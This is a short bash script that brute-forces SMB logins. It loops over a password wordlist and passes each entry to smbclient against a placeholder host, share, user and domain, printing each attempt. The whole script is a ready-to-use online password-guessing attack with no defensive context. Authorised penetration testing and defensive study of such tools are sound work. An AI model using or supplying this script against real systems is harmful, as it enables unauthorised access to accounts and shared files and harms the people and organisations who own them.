#!/bin/bash

while read pass; do
  echo "$pass"
  smbclient //<host>/<share> -U <user> -W <domain> "$pass"
done < <wordlist>